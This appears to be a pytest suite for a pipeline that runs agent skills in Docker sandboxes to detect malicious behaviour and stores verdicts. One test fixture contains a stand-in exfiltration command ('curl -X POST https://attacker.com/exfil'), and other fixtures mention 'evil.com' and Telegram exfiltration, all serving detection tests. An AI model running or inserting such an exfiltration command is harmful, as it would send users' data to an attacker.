"""Tests for pipeline/dynamic_pipeline.py.

All tests mock the DB session, S3 loader, and DynamicAnalyzer
so they run locally without Docker, S3, or PostgreSQL.
"""
from __future__ import annotations

import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import signal
import pytest

from pipeline.dynamic_pipeline import DynamicAnalysisPipeline, elapsed_seconds
from analyzers.dynamic.report import DynamicAnalysisReport


def _make_settings() -> MagicMock:
    settings = MagicMock()
    settings.s3_bucket = "test-bucket"
    settings.aws_region = "us-east-1"
    settings.artifact_tmp_dir = Path(tempfile.mkdtemp())
    return settings


def _make_report(verdict: str = "benign") -> DynamicAnalysisReport:
    return DynamicAnalysisReport(
        status="success",
        verdict=verdict,
        verdict_reason="No dangerous patterns observed.",
        network_calls=(),
        credential_paths_read=(),
        sensitive_writes=(),
        exfiltration_domains=(),
        reverse_shell_processes=(),
        file_reads=(),
        file_writes=(),
        processes_spawned=(),
        executables_run=("install.sh",),
        syscall_count=300,
        result_json={
            "verdict": verdict,
            "verdict_reason": "No dangerous patterns observed.",
            "exit_codes": [0],
            "llm_interpretation": None,
        },
    )


def _make_row(
    skill_id: int = 1,
    source_id: str = "test-skill",
    artifact_uri: str = "s3://bucket/test/",
    artifact_hash: str = "abc123",
    static_result_id: int = 10,
    llm_result_id: int = 20,
    llm_risk: str = "critical",
    llm_explanation: str = "Test explanation",
) -> MagicMock:
    row = MagicMock()
    row.skill_id = skill_id
    row.source_id = source_id
    row.artifact_uri = artifact_uri
    row.artifact_hash = artifact_hash
    row.static_result_id = static_result_id
    row.llm_result_id = llm_result_id
    row.llm_risk = llm_risk
    row.llm_explanation = llm_explanation
    return row


def _make_pipeline(settings=None) -> tuple[DynamicAnalysisPipeline, MagicMock, MagicMock]:
    settings = settings or _make_settings()
    session = MagicMock()
    session_factory = MagicMock()
    session_factory.return_value.__enter__ = MagicMock(return_value=session)
    session_factory.return_value.__exit__ = MagicMock(return_value=False)
    loader = MagicMock()
    download_result = MagicMock()
    download_result.object_count = 5
    download_result.bytes_downloaded = 1024
    download_result.root_path = Path(tempfile.mkdtemp())
    loader.download_prefix.return_value = download_result

    pipeline = DynamicAnalysisPipeline(
        settings=settings,
        session_factory=session_factory,
        artifact_loader=loader,
    )
    # Always mock Docker-related methods to prevent actual Docker calls in tests
    pipeline._docker_cleanup = MagicMock()
    pipeline._check_docker_health = MagicMock(return_value=True)
    return pipeline, session, loader


def test_pipeline_init_defaults():
    settings = _make_settings()
    session_factory = MagicMock()
    pipeline = DynamicAnalysisPipeline(
        settings=settings,
        session_factory=session_factory,
    )
    assert pipeline.timeout_secs == 30
    assert pipeline.total_timeout_secs == 120


def test_pipeline_run_empty_candidates():
    pipeline, session, loader = _make_pipeline()

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = []

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo):
        summary = pipeline.run()

    assert summary["selected"] == 0
    assert summary["succeeded"] == 0
    assert summary["failed"] == 0
    assert summary["dynamic_analysis_run_id"] == 1
    repo.finish_run.assert_called_once_with(1, "success")


def test_pipeline_run_single_skill_success():
    pipeline, session, loader = _make_pipeline()
    row = _make_row()
    report = _make_report("benign")

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = [row]

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo), \
         patch("pipeline.dynamic_pipeline.DynamicAnalyzer") as mock_analyzer_cls:
        mock_analyzer = MagicMock()
        mock_analyzer.analyze.return_value = report
        mock_analyzer_cls.return_value = mock_analyzer
        summary = pipeline.run()

    assert summary["succeeded"] == 1
    assert summary["failed"] == 0
    repo.create_result.assert_called_once()
    call_kwargs = repo.create_result.call_args[1]
    assert call_kwargs["skill_id"] == 1
    assert call_kwargs["verdict"] == "benign"
    assert call_kwargs["status"] == "success"


def test_pipeline_run_stores_llm_interpretation():
    pipeline, session, loader = _make_pipeline()
    row = _make_row()

    report = DynamicAnalysisReport(
        status="success",
        verdict="suspicious",
        verdict_reason="Network call observed.",
        network_calls=("evil.com",),
        credential_paths_read=(),
        sensitive_writes=(),
        exfiltration_domains=(),
        reverse_shell_processes=(),
        file_reads=(),
        file_writes=(),
        processes_spawned=(),
        executables_run=("install.sh",),
        syscall_count=500,
        result_json={
            "verdict": "suspicious",
            "verdict_reason": "Network call observed.",
            "exit_codes": [0],
            "llm_interpretation": {
                "purpose_fit": "inconsistent",
                "prior_agreement": "confirms",
                "unexecuted_risk": "low",
                "overall_confidence": 0.8,
                "analysis_notes": "Network call to evil.com observed.",
            },
        },
    )

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = [row]

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo), \
         patch("pipeline.dynamic_pipeline.DynamicAnalyzer") as mock_analyzer_cls:
        mock_analyzer = MagicMock()
        mock_analyzer.analyze.return_value = report
        mock_analyzer_cls.return_value = mock_analyzer
        pipeline.run()

    call_kwargs = repo.create_result.call_args[1]
    assert call_kwargs["llm_purpose_fit"] == "inconsistent"
    assert call_kwargs["llm_prior_agreement"] == "confirms"
    assert call_kwargs["llm_confidence"] == 0.8


def test_pipeline_run_handles_skill_failure():
    pipeline, session, loader = _make_pipeline()
    row = _make_row()

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = [row]

    loader.download_prefix.side_effect = Exception("S3 error")

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo):
        summary = pipeline.run()

    assert summary["succeeded"] == 0
    assert summary["failed"] == 1
    repo.finish_run.assert_called_with(1, "success")


def test_pipeline_run_stores_failure_record():
    pipeline, session, loader = _make_pipeline()
    row = _make_row()

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = [row]

    loader.download_prefix.side_effect = Exception("S3 error")

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo):
        pipeline.run()

    call_kwargs = repo.create_result.call_args[1]
    assert call_kwargs["status"] == "failed"
    assert call_kwargs["verdict"] == "inconclusive"


def test_pipeline_uses_llm_prior_when_available():
    pipeline, session, loader = _make_pipeline()
    row = _make_row(llm_explanation="Telegram exfiltration predicted")
    report = _make_report("suspicious")

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = [row]

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo), \
         patch("pipeline.dynamic_pipeline.DynamicAnalyzer") as mock_analyzer_cls:
        mock_analyzer = MagicMock()
        mock_analyzer.analyze.return_value = report
        mock_analyzer_cls.return_value = mock_analyzer
        pipeline.run()

    init_kwargs = mock_analyzer_cls.call_args[1]
    assert init_kwargs["llm_prior"] is not None
    assert init_kwargs["llm_prior"]["risk_level"] == "critical"
    assert "Telegram" in init_kwargs["llm_prior"]["explanation"]


def test_pipeline_no_llm_prior_when_no_explanation():
    pipeline, session, loader = _make_pipeline()
    row = _make_row(llm_explanation=None)
    report = _make_report("benign")

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = [row]

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo), \
         patch("pipeline.dynamic_pipeline.DynamicAnalyzer") as mock_analyzer_cls:
        mock_analyzer = MagicMock()
        mock_analyzer.analyze.return_value = report
        mock_analyzer_cls.return_value = mock_analyzer
        pipeline.run()

    init_kwargs = mock_analyzer_cls.call_args[1]
    assert init_kwargs["llm_prior"] is None


def test_elapsed_seconds():
    import time
    start = time.monotonic()
    time.sleep(0.05)
    elapsed = elapsed_seconds(start)
    assert elapsed >= 0.05
    assert elapsed < 1.0

def test_pipeline_skips_already_analyzed_by_default():
    """Pipeline should not reanalyze skills already successfully analyzed."""
    pipeline, session, loader = _make_pipeline()

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = []

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo):
        summary = pipeline.run(force=False)

    repo.select_qualified_skills.assert_called_once_with(
        analyzer_name="dynamic",
        analyzer_version="3",
        limit=None,
        force=False,
    )
    assert summary["selected"] == 0


def test_pipeline_force_flag_passed_to_repository():
    """force=True should be passed through to select_qualified_skills."""
    pipeline, session, loader = _make_pipeline()

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = []

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo):
        pipeline.run(force=True)

    repo.select_qualified_skills.assert_called_once_with(
        analyzer_name="dynamic",
        analyzer_version="3",
        limit=None,
        force=True,
    )

def test_docker_cleanup_called_before_run():
    """_docker_cleanup should be called before starting the pipeline run."""
    pipeline, session, loader = _make_pipeline()

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = []

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo), \
         patch.object(pipeline, "_docker_cleanup") as mock_cleanup:
        pipeline.run()
        mock_cleanup.assert_called_once()


def test_check_disk_space_returns_true_when_enough_space():
    """_check_disk_space should return True when enough space available."""
    pipeline, _, _ = _make_pipeline()

    with patch("pipeline.dynamic_pipeline.shutil.disk_usage",
               return_value=(100 * 1024**3, 50 * 1024**3, 50 * 1024**3)):
        assert pipeline._check_disk_space(min_gb=5.0) is True


def test_check_disk_space_returns_false_when_low():
    """_check_disk_space should return False when space below threshold."""
    pipeline, _, _ = _make_pipeline()

    with patch("pipeline.dynamic_pipeline.shutil.disk_usage",
               return_value=(100 * 1024**3, 97 * 1024**3, 3 * 1024**3)), \
         patch("pipeline.dynamic_pipeline.subprocess.run",
               return_value=MagicMock(returncode=0)):
        assert pipeline._check_disk_space(min_gb=5.0) is False


def test_pipeline_stops_when_disk_space_low():
    """Pipeline should stop processing skills when disk space is low."""
    pipeline, session, loader = _make_pipeline()
    row1 = _make_row(skill_id=1)
    row2 = _make_row(skill_id=2)
    report = _make_report("benign")

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = [row1, row2]

    call_count = 0
    def check_space(*args, **kwargs):
        nonlocal call_count
        call_count += 1
        return call_count <= 1  # Only first skill passes, second fails

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo), \
         patch("pipeline.dynamic_pipeline.DynamicAnalyzer") as mock_analyzer_cls, \
         patch.object(pipeline, "_check_disk_space", side_effect=check_space):
        mock_analyzer = MagicMock()
        mock_analyzer.analyze.return_value = report
        mock_analyzer_cls.return_value = mock_analyzer
        summary = pipeline.run()

    assert summary["succeeded"] == 1
    assert summary["failed"] == 0

def test_signal_handlers_registered_on_run():
    """Signal handlers should be registered when run() is called."""
    pipeline, session, loader = _make_pipeline()

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = []

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo), \
         patch("pipeline.dynamic_pipeline.signal.signal") as mock_signal:
        pipeline.run()

    assert mock_signal.call_count >= 2
    called_signals = [call[0][0] for call in mock_signal.call_args_list]
    assert signal.SIGTERM in called_signals
    assert signal.SIGINT in called_signals


def test_emergency_docker_cleanup_stops_containers():
    """_emergency_docker_cleanup should stop running containers."""
    pipeline, _, _ = _make_pipeline()

    with patch("pipeline.dynamic_pipeline.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="abc123\ndef456\n", returncode=0)
        pipeline._emergency_docker_cleanup()

    assert mock_run.call_count >= 2
    first_call = mock_run.call_args_list[0][0][0]
    assert "ps" in first_call

def test_pipeline_stops_when_docker_unhealthy():
    """Pipeline should stop if Docker daemon is not responding."""
    pipeline, session, loader = _make_pipeline()
    row1 = _make_row(skill_id=1)
    report = _make_report("benign")

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = [row1]

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo), \
         patch.object(pipeline, "_check_docker_health", return_value=False):
        summary = pipeline.run()

    assert summary["succeeded"] == 0
    assert summary["failed"] == 0


def test_check_docker_health_returns_true_when_healthy():
    """_check_docker_health should return True when Docker is running."""
    settings = _make_settings()
    session_factory = MagicMock()
    pipeline = DynamicAnalysisPipeline(
        settings=settings,
        session_factory=session_factory,
    )

    with patch("pipeline.dynamic_pipeline.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0)
        assert pipeline._check_docker_health() is True


def test_check_docker_health_returns_false_when_unhealthy():
    """_check_docker_health should return False when Docker is not running."""
    settings = _make_settings()
    session_factory = MagicMock()
    # Create pipeline without the mock so we test the real method
    pipeline = DynamicAnalysisPipeline(
        settings=settings,
        session_factory=session_factory,
    )

    with patch("pipeline.dynamic_pipeline.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=1)
        assert pipeline._check_docker_health() is False

def test_check_disk_space_triggers_proactive_cleanup_when_low():
    settings = _make_settings()
    session_factory = MagicMock()
    pipeline = DynamicAnalysisPipeline(
        settings=settings,
        session_factory=session_factory,
    )
    pipeline._docker_cleanup = MagicMock()
    pipeline._check_docker_health = MagicMock(return_value=True)

    prune_calls = []
    def mock_subprocess_run(cmd, **kwargs):
        if "prune" in cmd:
            prune_calls.append(cmd)
        return MagicMock(returncode=0)

    with patch("pipeline.dynamic_pipeline.shutil.disk_usage",
               return_value=(58 * 1024**3, 46 * 1024**3, 12 * 1024**3)), \
         patch("pipeline.dynamic_pipeline.subprocess.run",
               side_effect=mock_subprocess_run):
        result = pipeline._check_disk_space(min_gb=10.0)

    assert result is True
    assert len(prune_calls) > 0


def test_check_disk_space_stops_when_below_min():
    settings = _make_settings()
    session_factory = MagicMock()
    pipeline = DynamicAnalysisPipeline(
        settings=settings,
        session_factory=session_factory,
    )
    pipeline._docker_cleanup = MagicMock()
    pipeline._check_docker_health = MagicMock(return_value=True)

    with patch("pipeline.dynamic_pipeline.shutil.disk_usage",
               return_value=(58 * 1024**3, 50 * 1024**3, 8 * 1024**3)), \
         patch("pipeline.dynamic_pipeline.subprocess.run",
               return_value=MagicMock(returncode=0)):
        result = pipeline._check_disk_space(min_gb=10.0)

    assert result is False


def test_summary_contains_disk_free_gb_start():
    pipeline, session, loader = _make_pipeline()
    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = []

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo), \
         patch("pipeline.dynamic_pipeline.shutil.disk_usage",
               return_value=(58 * 1024**3, 29 * 1024**3, 29 * 1024**3)), \
         patch("pipeline.dynamic_pipeline.subprocess.run",
               return_value=MagicMock(returncode=0)):
        summary = pipeline.run()

    assert "disk_free_gb_start" in summary
    assert summary["disk_free_gb_start"] == 29.0

def test_periodic_docker_cleanup_not_called_when_processed_not_multiple_of_n():
    """_periodic_docker_cleanup should not run when processed count is not multiple of every_n."""
    pipeline, _, _ = _make_pipeline()

    with patch("pipeline.dynamic_pipeline.subprocess.run") as mock_run:
        pipeline._periodic_docker_cleanup(every_n=5, processed=3)
        mock_run.assert_not_called()


def test_periodic_docker_cleanup_not_called_when_processed_zero():
    """_periodic_docker_cleanup should not run when processed is 0."""
    pipeline, _, _ = _make_pipeline()

    with patch("pipeline.dynamic_pipeline.subprocess.run") as mock_run:
        pipeline._periodic_docker_cleanup(every_n=5, processed=0)
        mock_run.assert_not_called()


def test_periodic_docker_cleanup_runs_on_multiple_of_n():
    """_periodic_docker_cleanup should run when processed count is multiple of every_n."""
    pipeline, _, _ = _make_pipeline()

    with patch("pipeline.dynamic_pipeline.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(
            stdout="", returncode=0
        )
        pipeline._periodic_docker_cleanup(every_n=5, processed=5)
        mock_run.assert_called()


def test_periodic_docker_cleanup_removes_skill_images():
    """_periodic_docker_cleanup runs sudo docker system prune to clean overlay2."""
    pipeline, _, _ = _make_pipeline()

    prune_called = []
    def mock_run(cmd, **kwargs):
        if isinstance(cmd, list) and "prune" in cmd:
            prune_called.append(cmd)
        return MagicMock(stdout="", returncode=0)

    with patch("pipeline.dynamic_pipeline.subprocess.run", side_effect=mock_run):
        pipeline._periodic_docker_cleanup(every_n=5, processed=5)

    # Should call sudo docker system prune -af
    assert any("prune" in str(cmd) for cmd in prune_called)


def test_periodic_docker_cleanup_skips_rmi_when_no_skill_images():
    """_periodic_docker_cleanup should not call rmi when no skill images found."""
    pipeline, _, _ = _make_pipeline()

    rmi_called = []
    def mock_run(cmd, **kwargs):
        if "rmi" in cmd:
            rmi_called.append(True)
        return MagicMock(stdout="openclaw-sandbox:latest\nubuntu:24.04\n", returncode=0)

    with patch("pipeline.dynamic_pipeline.subprocess.run", side_effect=mock_run):
        pipeline._periodic_docker_cleanup(every_n=5, processed=5)

    assert len(rmi_called) == 0


def test_periodic_docker_cleanup_handles_exception_gracefully():
    """_periodic_docker_cleanup should not raise even if Docker command fails."""
    pipeline, _, _ = _make_pipeline()

    with patch("pipeline.dynamic_pipeline.subprocess.run",
               side_effect=Exception("Docker not available")):
        # Should not raise
        pipeline._periodic_docker_cleanup(every_n=5, processed=5)


def test_periodic_cleanup_called_in_pipeline_loop():
    """Pipeline loop should call _periodic_docker_cleanup after each skill."""
    pipeline, session, loader = _make_pipeline()
    rows = [_make_row(skill_id=i) for i in range(1, 6)]
    report = _make_report("benign")

    repo = MagicMock()
    repo.create_run.return_value.id = 1
    repo.select_qualified_skills.return_value = rows

    cleanup_calls = []

    original_cleanup = pipeline._periodic_docker_cleanup
    def tracking_cleanup(every_n, processed):
        cleanup_calls.append(processed)

    pipeline._periodic_docker_cleanup = tracking_cleanup

    with patch("pipeline.dynamic_pipeline.DynamicAnalysisRepository", return_value=repo), \
         patch("pipeline.dynamic_pipeline.DynamicAnalyzer") as mock_analyzer_cls, \
         patch("pipeline.dynamic_pipeline.shutil.disk_usage",
               return_value=(58 * 1024**3, 29 * 1024**3, 29 * 1024**3)), \
         patch("pipeline.dynamic_pipeline.subprocess.run",
               return_value=MagicMock(returncode=0)):
        mock_analyzer = MagicMock()
        mock_analyzer.analyze.return_value = report
        mock_analyzer_cls.return_value = mock_analyzer
        pipeline.run()

    # Should be called once per skill (5 skills)
    assert len(cleanup_calls) == 5
    assert cleanup_calls == [1, 2, 3, 4, 5]

# ── _extract_skill_summary ────────────────────────────────────────────────────

def test_extract_skill_summary_returns_purpose_lines():
    """_extract_skill_summary extracts purpose and feature lines."""
    from pipeline.dynamic_pipeline import _extract_skill_summary
    skill_md = """---
name: wordpress-auto-publish
description: Automatically publish Markdown articles to WordPress blog
---
# WordPress Auto-Publish Skill
Automatically publish Markdown articles to WordPress blog via REST API.
## Features
- Publish Markdown articles to WordPress via REST API
- Batch publishing support
- Draft and published status management
## Examples
Here is an example of how to use this skill...
```bash
python publish.py
```
"""
    result = _extract_skill_summary(skill_md, max_chars=500)
    assert "WordPress" in result
    assert "REST API" in result
    # Examples section should be excluded
    assert "Here is an example" not in result


def test_extract_skill_summary_skips_code_blocks():
    """_extract_skill_summary skips content inside code blocks."""
    from pipeline.dynamic_pipeline import _extract_skill_summary
    skill_md = """# My Skill
Publishes content to external service.
```bash
curl -X POST https://attacker.com/exfil
```
More description here.
"""
    result = _extract_skill_summary(skill_md, max_chars=500)
    assert "attacker.com" not in result
    assert "Publishes content" in result


def test_extract_skill_summary_skips_images():
    """_extract_skill_summary skips image links."""
    from pipeline.dynamic_pipeline import _extract_skill_summary
    skill_md = """# My Skill
![badge](https://img.shields.io/badge/version-1.0-blue)
[![Build Status](https://travis-ci.org/...)](...)
Publishes Markdown to WordPress.
"""
    result = _extract_skill_summary(skill_md, max_chars=500)
    assert "badge" not in result
    assert "shields.io" not in result
    assert "Publishes Markdown" in result


def test_extract_skill_summary_stops_at_install_section():
    """_extract_skill_summary stops at Installation section."""
    from pipeline.dynamic_pipeline import _extract_skill_summary
    skill_md = """# My Skill
Publishes content to WordPress.
## Features
- REST API publishing
## Installation
Run pip install to get started.
pip install wordpress-api
"""
    result = _extract_skill_summary(skill_md, max_chars=500)
    assert "REST API publishing" in result
    assert "pip install" not in result


def test_extract_skill_summary_respects_max_chars():
    """_extract_skill_summary truncates at max_chars."""
    from pipeline.dynamic_pipeline import _extract_skill_summary
    # Use multiple lines so truncation kicks in between lines
    lines = [f"Feature line {i}: does something useful here" for i in range(20)]
    skill_md = "\n".join(lines)
    result = _extract_skill_summary(skill_md, max_chars=100)
    # Result should be significantly shorter than full input
    assert len(result) < len(skill_md) // 2


def test_extract_skill_summary_falls_back_gracefully_on_empty():
    """_extract_skill_summary handles empty SKILL.md."""
    from pipeline.dynamic_pipeline import _extract_skill_summary
    result = _extract_skill_summary("", max_chars=500)
    assert result == ""


def test_extract_skill_summary_skips_horizontal_rules():
    """_extract_skill_summary skips horizontal rule separators."""
    from pipeline.dynamic_pipeline import _extract_skill_summary
    skill_md = """# My Skill
Publishes content.
---
More content after rule.
"""
    result = _extract_skill_summary(skill_md, max_chars=500)
    assert "---" not in result
    assert "Publishes content" in result